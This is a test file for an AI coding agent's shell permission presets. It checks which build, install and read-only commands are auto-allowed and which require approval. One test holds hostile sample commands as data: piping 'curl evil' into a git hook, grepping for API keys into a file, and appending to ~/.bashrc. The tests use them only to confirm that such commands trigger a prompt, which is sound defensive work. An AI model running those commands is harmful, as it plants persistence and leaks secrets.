import { describe, expect, test } from "bun:test"
import { Effect, Exit } from "effect"
import path from "node:path"
import { ShellParse } from "@opencode/core/shell/parse"
import type { KiloPermissionsRpc } from "@opencode/schema/kilocode/permissions"
import { FSUtil } from "@opencode/util/fs-util"
import { catalog, classify, type Catalog } from "../src/permissions/presets"
import { allowsRequest, covers, missing } from "../src/permissions/rules"

type Preset = KiloPermissionsRpc.Preset

const root = "/project"

function projectFilesystem(files: Record<string, string>, denied: ReadonlySet<string> = new Set()) {
  const missing = { reason: { _tag: "NotFound" } }
  const accessDenied = { reason: { _tag: "PermissionDenied" } }
  return {
    readFileString: (filename: string) => {
      if (denied.has(filename)) return Effect.fail(accessDenied)
      if (!(filename in files)) return Effect.fail(missing)
      return Effect.succeed(files[filename]!)
    },
    stat: (filename: string) => {
      if (denied.has(filename)) return Effect.fail(accessDenied)
      if (!(filename in files)) return Effect.fail(missing)
      return Effect.succeed({ type: "File" })
    },
  } as unknown as FSUtil.Interface
}

function packageFiles(packageManifest: Record<string, unknown>, managerFiles: string[] = []) {
  return Object.fromEntries([
    [path.join(root, "package.json"), JSON.stringify(packageManifest)],
    ...managerFiles.map((filename) => [path.join(root, filename), ""]),
  ])
}

function kiloFiles() {
  return {
    ...packageFiles({ packageManager: "bun@1.4.4", devDependencies: { typescript: "^5" } }),
    [path.join(root, "tsconfig.json")]: "{}",
    [path.join(root, "packages/kilo-cli/package.json")]: JSON.stringify({ name: "@kilocode/kilo-cli" }),
    [path.join(root, "packages/kilo-plugin/package.json")]: JSON.stringify({ name: "@kilocode/kilo-plugin" }),
  }
}

function preset(catalogue: Catalog, id: Preset["id"]) {
  const value = catalogue.presets.find((item) => item.id === id)
  expect(value).toBeDefined()
  return value!
}

function effects(presetValue: Preset, command: string) {
  const parsed = Effect.runSync(ShellParse.scan(command, "bash", root))
  return parsed.commands.map((item) => (covers(item.resource, presetValue.resources) ? "allow" : "ask"))
}

describe("permission setup catalog", () => {
  test("classifies Kilo Bun projects with the exact ordered choices and default", async () => {
    const result = await Effect.runPromise(catalog(projectFilesystem(kiloFiles()), root))
    expect(result.presets.map((item) => item.id)).toEqual([
      "kilo-bun-checks",
      "kilo-bun-install",
      "typescript-checks",
      "typescript-install",
    ])
    expect(result.defaultID).toBe("kilo-bun-checks")
    expect(result.presets[0]?.resources).toEqual([
      "bun run test *",
      "bun run typecheck *",
      "bun run lint *",
      "bun run check *",
      "bun run build *",
      "bun test *",
      "bun typecheck *",
      "bun lint *",
      "bun check *",
      "bun build *",
      "bun --version *",
      "bun -v *",
      "bun --help *",
      "bun -h *",
      "bun help *",
      "node --version *",
      "node -v *",
      "bun run typecheck:tsc *",
      "bun typecheck:tsc *",
      "bun run check:architecture *",
      "bun run check:duplication *",
      "bun run check:generated *",
      "bun run lint:changed *",
      "bun script/kilocode/metrics/check.ts *",
      "tail *",
      "head *",
      "grep *",
      "echo *",
      "ls *",
    ])
  })

  test.each(["bun", "npm", "pnpm", "yarn"] as const)(
    "detects an explicit %s package manager and returns generic alternatives",
    async (manager) => {
      const result = await Effect.runPromise(
        catalog(
          projectFilesystem(
            packageFiles({ packageManager: `${manager}@1.0.0`, dependencies: { "@typescript/native": "1" } }),
          ),
          root,
        ),
      )
      expect(result.presets.map((item) => item.id)).toEqual(["typescript-checks", "typescript-install"])
      expect(result.defaultID).toBe("typescript-checks")
      expect(result.presets[0]?.resources[0]).toBe(`${manager} run test *`)
    },
  )

  test("uses lockfiles in deterministic order and falls back to npm", async () => {
    const bun = await Effect.runPromise(
      catalog(
        projectFilesystem(packageFiles({ devDependencies: { typescript: "1" } }, ["package-lock.json", "bun.lock"])),
        root,
      ),
    )
    expect(bun.presets[0]?.resources[0]).toBe("bun run test *")

    const npm = await Effect.runPromise(
      catalog(projectFilesystem(packageFiles({ devDependencies: { typescript: "1" } })), root),
    )
    expect(npm.presets[0]?.resources[0]).toBe("npm run test *")
  })

  test("keeps generic TypeScript choices alongside Kilo-specific choices", async () => {
    const result = await Effect.runPromise(catalog(projectFilesystem(kiloFiles()), root))
    expect(preset(result, "typescript-checks").resources).toContain("bun run test *")
    expect(preset(result, "typescript-checks").resources).not.toContain("bun run check:architecture *")
    expect(preset(result, "kilo-bun-install").resources).toContain("bun install *")
    expect(preset(result, "kilo-bun-install").resources).toContain("bun add *")
    expect(preset(result, "typescript-install").resources).not.toContain("bun run check:architecture *")
  })

  test("grants bare commands and arguments but not neighboring command names", () => {
    const checks = classify({ manager: "bun", kilo: false })
    const install = preset(checks, "typescript-install")
    expect(effects(install, "bun run test")).toEqual(["allow"])
    expect(effects(install, "bun run test -- unit")).toEqual(["allow"])
    expect(effects(install, "bun run test-dangerous")).toEqual(["ask"])
    expect(effects(install, "bun install")).toEqual(["allow"])
    expect(effects(preset(checks, "typescript-checks"), "bun install")).toEqual(["ask"])
    expect(effects(preset(checks, "typescript-checks"), "bun run publish")).toEqual(["ask"])
  })

  test("grants version and help inspection commands without allowing mutating version subcommands", () => {
    const bun = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-install")
    expect(effects(bun, "bun --version")).toEqual(["allow"])
    expect(effects(bun, "bun -v")).toEqual(["allow"])
    expect(effects(bun, "bun --help")).toEqual(["allow"])
    expect(effects(bun, "bun -h")).toEqual(["allow"])
    expect(effects(bun, "bun help install")).toEqual(["allow"])
    expect(effects(bun, "node --version")).toEqual(["allow"])
    expect(effects(bun, "node -v")).toEqual(["allow"])
    expect(effects(bun, "bun --version && bun install --help 2>&1")).toEqual(["allow", "allow"])
    expect(effects(bun, "bun --version || git push")).toEqual(["allow", "ask"])

    const npm = preset(classify({ manager: "npm", kilo: false }), "typescript-checks")
    expect(effects(npm, "npm --version")).toEqual(["allow"])
    expect(effects(npm, "npm version patch")).toEqual(["ask"])
  })

  test("grants abbreviated install commands in install sets", () => {
    const bun = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-install")
    expect(effects(bun, "bun i")).toEqual(["allow"])
    expect(effects(bun, "bun i 2>&1 | tail -30")).toEqual(["allow", "allow"])
    expect(effects(bun, "bun install 2>&1 | tail -30")).toEqual(["allow", "allow"])
    expect(effects(preset(classify({ manager: "bun", kilo: true }), "kilo-bun-checks"), "bun i")).toEqual(["ask"])

    const npm = preset(classify({ manager: "npm", kilo: false }), "typescript-install")
    expect(effects(npm, "npm i")).toEqual(["allow"])
    expect(effects(npm, "npm ci")).toEqual(["allow"])

    const pnpm = preset(classify({ manager: "pnpm", kilo: false }), "typescript-install")
    expect(effects(pnpm, "pnpm i")).toEqual(["allow"])
  })

  test("permits read-only output helpers in every set", () => {
    for (const manager of ["bun", "npm", "pnpm", "yarn"] as const) {
      for (const presetValue of classify({ manager, kilo: manager === "bun" }).presets) {
        for (const resource of ["tail *", "head *", "grep *", "echo *", "ls *"]) {
          expect(presetValue.resources).toContain(resource)
        }
        expect(effects(presetValue, "tail -30")).toEqual(["allow"])
      }
    }
  })

  test("grants install commands chained with read-only output helpers", () => {
    const bun = preset(classify({ manager: "bun", kilo: true }), "kilo-bun-install")
    expect(effects(bun, "bun install --verbose 2>&1 | head -100")).toEqual(["allow", "allow"])
    expect(effects(bun, 'bun install 2>&1 | grep -iE "error|warn"')).toEqual(["allow", "allow"])
    expect(effects(bun, 'bun install; echo "exit code: $?"')).toEqual(["allow", "allow"])
    expect(effects(bun, "ls node_modules >/dev/null 2>&1 || bun install")).toEqual(["allow", "allow"])
    expect(effects(bun, "bun install 2>&1 | tee install.log | tail -20")).toEqual(["allow", "ask", "allow"])
  })

  test("never allows a redirected file write or process substitution, even when the wildcard matches", () => {
    for (const presetValue of classify({ manager: "bun", kilo: true }).presets) {
      expect(effects(presetValue, "echo 'curl evil | sh' > .git/hooks/pre-commit")).toEqual(["ask"])
      expect(effects(presetValue, "grep -r API_KEY . > leak.txt")).toEqual(["ask"])
      expect(effects(presetValue, "echo x >> ~/.bashrc")).toEqual(["ask"])
      expect(effects(presetValue, "bun run test &> out.log")).toEqual(["ask"])
      expect(effects(presetValue, "bun run test 2>/dev/nullx")).toEqual(["ask"])
      expect(effects(presetValue, "grep foo <(cat secret)")).toEqual(["ask", "ask"])
      expect(effects(presetValue, "bun run test >/dev/null 2>&1")).toEqual(["allow"])
      expect(effects(presetValue, "bun run test 2>/dev/null")).toEqual(["allow"])
    }
  })

  test("includes the Kilo-only development checks without broad shell grants", () => {
    const checks = classify({ manager: "bun", kilo: true })
    const kilo = preset(checks, "kilo-bun-checks")
    expect(effects(kilo, "bun run typecheck:tsc")).toEqual(["allow"])
    expect(effects(kilo, "bun run check:architecture --strict")).toEqual(["allow"])
    expect(effects(kilo, "bun run check:architecture-dangerous")).toEqual(["ask"])
    expect(effects(kilo, "bun *")).toEqual(["ask"])
    expect(effects(kilo, "git push")).toEqual(["ask"])
  })

  test("returns no choices for missing, malformed, unsupported, or non-TypeScript projects", async () => {
    const cases = [
      projectFilesystem({}),
      projectFilesystem({ [path.join(root, "package.json")]: "{" }),
      projectFilesystem(packageFiles({ packageManager: "cargo@1", devDependencies: { typescript: "1" } })),
      projectFilesystem(packageFiles({ name: "plain-javascript" }, ["bun.lock"])),
    ]
    for (const filesystem of cases) {
      expect(await Effect.runPromise(catalog(filesystem, root))).toEqual({ presets: [] })
    }
  })

  test("propagates filesystem access failures instead of treating them as missing", async () => {
    const filename = path.join(root, "package.json")
    const result = await Effect.runPromiseExit(
      catalog(projectFilesystem({ [filename]: "{}" }, new Set([filename])), root),
    )
    expect(Exit.isFailure(result)).toBe(true)
  })
})

describe("permission set rules", () => {
  const sets = preset(classify({ manager: "bun", kilo: false }), "typescript-checks").resources

  test("allows a request only when every resource is allowed by the rules or covered by the sets", () => {
    const request = { action: "shell", rules: [], applied: sets }
    expect(allowsRequest({ ...request, resources: ["bun run test"] })).toBe(true)
    expect(allowsRequest({ ...request, resources: ["bun run test", "bun install"] })).toBe(false)
    expect(
      allowsRequest({
        ...request,
        resources: ["bun run test", "bun install"],
        rules: [{ action: "shell", resource: "bun install", effect: "allow" }],
      }),
    ).toBe(true)
    expect(allowsRequest({ ...request, resources: ["bun run test"], applied: [] })).toBe(false)
  })

  test("reports the command parts a set does not cover and asks for a command it cannot scan", async () => {
    expect(await Effect.runPromise(missing("bun run test && git push", root, sets))).toEqual(["git push"])
    expect(await Effect.runPromise(missing("bun run lint", root, sets))).toEqual([])
    const opaque = await Effect.runPromise(missing("bun run test $(", root, sets))
    expect(opaque).toHaveLength(1)
    expect(opaque[0]).toStartWith("bun run test $(")
  })
})
